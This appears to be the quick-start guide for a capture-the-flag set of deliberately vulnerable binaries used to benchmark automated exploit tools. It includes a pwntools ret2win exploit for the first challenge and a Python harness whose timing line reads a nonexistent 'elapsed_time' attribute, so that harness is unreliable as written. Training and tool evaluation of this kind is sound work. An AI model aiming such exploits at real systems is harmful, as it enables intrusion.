# Quick Start Guide

This guide will help you quickly get started with the CTF challenge set.

## Prerequisites

### Required
- GCC (C compiler)
- Make
- Linux x86-64 system

### Recommended
- Docker (for containerized testing)
- Python 3 with pwntools (`pip install pwntools`)
- GDB with pwndbg or gef
- ROPgadget (`pip install ropgadget`)
- checksec (`apt install checksec` or from pwntools)

## Installation

### 1. Clone Repository
```bash
git clone <repo-url>
cd ctf-challenges
```

### 2. Build All Challenges
```bash
./build_all.sh
```

This will compile all 21 challenges. Expected output:
```
Building all CTF challenges...
==============================

Building 01-stack-overflow-basic...
✓ 01-stack-overflow-basic built successfully
...
==============================
Build Summary:
  Total:   21
  Success: 21
  Failed:  0
All challenges built successfully!
```

### 3. Test Compilation
```bash
./test_all.sh
```

This verifies all binaries are correctly compiled and checks their properties.

## Running Individual Challenges

### Option 1: Run Binary Directly
```bash
cd 01-stack-overflow-basic
./challenge
```

### Option 2: Run with Docker
```bash
cd 01-stack-overflow-basic
docker build -t challenge01 .
docker run -it challenge01
```

## Testing Your Automated Tool

### Basic Test
```bash
# Test on simplest challenge
cd 01-stack-overflow-basic
your-tool ./challenge
```

### Full Benchmark
```bash
# Create results directory
mkdir results

# Test all challenges
for dir in */; do
    if [ -f "$dir/challenge" ]; then
        echo "Testing $dir..."
        timeout 300 your-tool "$dir/challenge" > "results/$dir.log" 2>&1
    fi
done

# Analyze results
grep -r "SUCCESS" results/
```

## Example: Manual Exploitation

Here's a quick example of manually exploiting challenge 01:

### 1. Check Protections
```bash
$ checksec ./01-stack-overflow-basic/challenge
    RELRO:    Partial RELRO
    STACK CANARY: No canary found
    NX:       NX enabled
    PIE:      No PIE
```

### 2. Find Offset
```python
from pwn import *

# Generate pattern
pattern = cyclic(200)

# Run and crash
p = process('./01-stack-overflow-basic/challenge')
p.sendlineafter(b'name: ', pattern)
p.wait()

# Find offset (if using coredump)
core = Coredump('./core')
offset = cyclic_find(core.read(core.sp, 4))
print(f"Offset: {offset}")
```

### 3. Exploit
```python
from pwn import *

elf = ELF('./01-stack-overflow-basic/challenge')
p = process(elf.path)

# Get win address
win = elf.symbols['win']

# Build payload
payload = b'A' * 72  # Offset
payload += p64(win)  # Return address

# Send and win
p.sendlineafter(b'name: ', payload)
p.interactive()
```

## Challenge Difficulty Guide

### Start Here (Easy)
1. **Challenge 01** - Basic stack overflow, no protections
2. **Challenge 05** - Format string leak
3. **Challenge 13** - Integer overflow
4. **Challenge 14** - Negative index

### Intermediate
1. **Challenge 02** - Stack overflow with canary leak
2. **Challenge 03** - Ret2libc
3. **Challenge 16** - Use-after-free
4. **Challenge 18** - Heap overflow

### Advanced
1. **Challenge 10** - Ret2PLT (multi-stage)
2. **Challenge 11** - Ret2syscall (static binary)
3. **Challenge 12** - Stack pivoting
4. **Challenge 17** - Double-free / tcache poisoning

### Expert
1. **Challenge 19** - Off-by-one (subtle)
2. **Challenge 20** - Multiple vulnerabilities
3. **Challenge 21** - Race condition

## Expected Tool Capabilities by Difficulty

### Easy Challenges (Should be 80%+ automated)
- Direct buffer overflow
- Simple format string
- Obvious integer bugs
- Basic heap bugs

### Medium Challenges (Should be 40-60% automated)
- Canary bypass via leak
- Ret2libc with leaked addresses
- Format string writes
- UAF exploitation

### Hard Challenges (May require manual assistance)
- Multi-stage exploitation
- Heap metadata corruption
- Advanced ROP techniques
- Race conditions

## Troubleshooting

### Build Errors
```bash
# If builds fail, try installing dependencies
sudo apt update
sudo apt install build-essential gcc-multilib

# For specific challenge
cd <challenge-dir>
make clean
make
```

### Docker Issues
```bash
# If Docker build fails
docker system prune  # Clean up
docker build --no-cache -t challenge .
```

### Runtime Issues
```bash
# If segfaults occur immediately
ulimit -c unlimited  # Enable coredumps
sudo sysctl -w kernel.core_pattern=core  # Set core pattern

# Check ASLR (should be enabled)
cat /proc/sys/kernel/randomize_va_space  # Should be 2
```

## Automated Tool Integration

### Template for Tool Testing
```python
#!/usr/bin/env python3

import os
import subprocess
import json

results = []

# Find all challenges
for challenge_dir in sorted(os.listdir('.')):
    binary = os.path.join(challenge_dir, 'challenge')

    if not os.path.exists(binary):
        continue

    print(f"Testing {challenge_dir}...")

    # Run your tool with timeout
    try:
        result = subprocess.run(
            ['your-tool', binary],
            timeout=300,
            capture_output=True,
            text=True
        )

        results.append({
            'challenge': challenge_dir,
            'detected': 'DETECTED' in result.stdout,
            'exploited': 'SUCCESS' in result.stdout,
            'time': result.elapsed_time
        })
    except subprocess.TimeoutExpired:
        results.append({
            'challenge': challenge_dir,
            'detected': False,
            'exploited': False,
            'time': 300
        })

# Save results
with open('results.json', 'w') as f:
    json.dump(results, f, indent=2)

# Print summary
total = len(results)
detected = sum(1 for r in results if r['detected'])
exploited = sum(1 for r in results if r['exploited'])

print(f"\nResults:")
print(f"  Detected:  {detected}/{total} ({detected*100//total}%)")
print(f"  Exploited: {exploited}/{total} ({exploited*100//total}%)")
```

## Next Steps

1. **Read the README**: Complete documentation in `README.md`
2. **Study Solutions**: Each challenge has a `SOLUTION.md`
3. **Run Tests**: Use your tool on the challenges
4. **Document Results**: Fill out `results_template.md`
5. **Iterate**: Improve your tool based on failures

## Support

- **Documentation**: See `README.md` for full details
- **Solutions**: Each challenge has detailed writeup
- **Issues**: Open issue on repository

## Resources

### Learning Paths
1. Start with easy challenges (01, 05, 13, 14)
2. Study solution writeups
3. Understand detection patterns
4. Build automation for each class
5. Test on medium challenges
6. Refine and improve

### Recommended Reading
- Challenge `SOLUTION.md` files
- pwntools documentation
- "The Shellcoder's Handbook"
- LiveOverflow YouTube channel

---

Happy hacking! 🚀
